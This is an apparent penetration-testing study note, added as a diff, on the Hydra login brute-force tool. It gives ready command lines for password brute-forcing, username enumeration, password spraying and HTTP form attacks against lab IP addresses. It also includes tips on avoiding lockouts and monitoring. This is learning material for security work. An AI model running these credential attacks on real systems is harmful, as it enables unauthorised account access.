@@ -1,0 +1,283 @@
+Hydra
+- A fast network login brute-force tool used to test authentication mechanisms on remote services.
+
+Stage in Attack Lifecycle:
+Recon → Initial Access → **Credential Attacks**
+
+
+==================================================
+1. Overview
+==================================================
+- Hydra is a popular password-cracking tool used during offensive security engagements.
+- It performs automated authentication attempts against network services using username and password combinations.
+
+Hydra supports many protocols including:
+
+- SSH
+- FTP
+- HTTP
+- HTTPS
+- SMB
+- RDP
+- Telnet
+- MySQL
+- PostgreSQL
+
+Hydra is commonly used during the **Initial Access phase** to discover valid credentials.
+
+
+==================================================
+2. Basic Usage
+==================================================
+
+Basic syntax:
+
+hydra [options] service://target
+
+
+Example:
+
+hydra -l admin -P passwords.txt ssh://192.168.1.100
+
+
+Explanation:
+
+-l admin
+    Target username
+
+-P passwords.txt
+    Password wordlist
+
+ssh://192.168.1.100
+    Target service and host
+
+
+==================================================
+3. Password Brute Force (Single User)
+==================================================
+- Attempts many passwords for one user.
+
+Example:
+
+hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt -t 4 -f -V telnet://192.168.56.101
+
+
+==================================================
+4. Username Brute Force (Single Password)
+==================================================
+- Attempts many usernames using a single password.
+
+Example:
+
+hydra -L users.txt -p msfadmin -t 4 -f -V telnet://192.168.56.101
+
+
+==================================================
+5. Full Credential Brute Force
+==================================================
+- Tests many usernames and many passwords.
+
+Example:
+
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -t 4 -f -V telnet://192.168.56.101
+
+
+==================================================
+6. Password Spraying
+==================================================
+- Attempts one password across many accounts.
+
+Example:
+
+hydra -L users.txt -p Summer2024! -t 4 -f telnet://192.168.56.101
+
+Password spraying helps avoid account lockouts.
+
+
+==================================================
+7. Test a Single Credential
+==================================================
+- Quickly verify if credentials work.
+
+Example:
+
+hydra -l admin -p admin telnet://192.168.56.101
+
+
+==================================================
+8. Custom Port Example
+==================================================
+- Useful when services run on non-standard ports.
+
+Example:
+
+hydra -l admin -P passwords.txt -s 2222 ssh://192.168.56.101
+
+
+==================================================
+9. Saving Results
+==================================================
+- Save successful credentials to a file.
+
+Example:
+
+hydra -L users.txt -P passwords.txt -o hydra_results.txt telnet://192.168.56.101
+
+
+==================================================
+10. Common Protocol Examples
+==================================================
+
+SSH
+
+hydra -l root -P passwords.txt ssh://192.168.1.100
+
+
+FTP
+
+hydra -l admin -P passwords.txt ftp://192.168.1.100
+
+
+Telnet
+
+hydra -l admin -P passwords.txt telnet://192.168.1.100
+
+
+HTTP Form Login
+
+hydra -L users.txt -P passwords.txt 192.168.1.100 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
+
+
+==================================================
+11. Hydra Workflow
+==================================================
+
+Reconnaissance
+        ↓
+Service Identified (SSH / FTP / Telnet)
+        ↓
+Usernames Collected
+        ↓
+Password Wordlist Selected
+        ↓
+Hydra Credential Attack
+        ↓
+Valid Credentials Found
+        ↓
+Initial Access
+
+
+==================================================
+12. Hydra Parameter Reference
+==================================================
+
+Username Options
+
+-l
+Single username
+
+-L
+Username wordlist
+
+
+Password Options
+
+-p
+Single password
+
+-P
+Password wordlist
+
+
+Performance Options
+
+-t
+Number of parallel tasks
+
+-f
+Stop after first valid login per host
+
+-F
+Stop attack globally after first valid login
+
+
+Output Options
+
+-v
+Show login attempts
+
+-V
+Verbose login attempts
+
+-o
+Output results to file
+
+
+Service Options
+
+-s
+Specify service port
+
+
+==================================================
+13. Operational Notes
+==================================================
+- Brute-force attacks generate significant authentication traffic.
+- These attacks may trigger:
+
+- Account lockouts
+- Intrusion detection alerts
+- Security monitoring systems
+
+Password spraying is often safer in monitored environments.
+
+
+==================================================
+14. Questions & Answers
+==================================================
+
+1. Question:
+What is Hydra used for?
+
+Answer:
+Hydra is a tool used to brute-force network authentication services.
+
+--------------------------------------------------
+
+2. Question:
+What is password spraying?
+
+Answer:
+Testing one password against many accounts to avoid lockouts.
+
+--------------------------------------------------
+
+3. Question:
+What does the -t option control?
+
+Answer:
+The number of parallel threads used during the attack.
+
+--------------------------------------------------
+
+4. Question:
+What does the -f option do?
+
+Answer:
+Stops the attack after the first valid credential is found for a host.
+
+--------------------------------------------------
+
+5. Question (Attack Perspective):
+Why are credential attacks effective?
+
+Answer:
+Because many users reuse weak or predictable passwords.
+
+--------------------------------------------------
+
+6. Question (Defensive Perspective):
+How can organizations defend against Hydra attacks?
+
+Answer:
+By implementing strong passwords, multi-factor authentication, and monitoring authentication attempts.
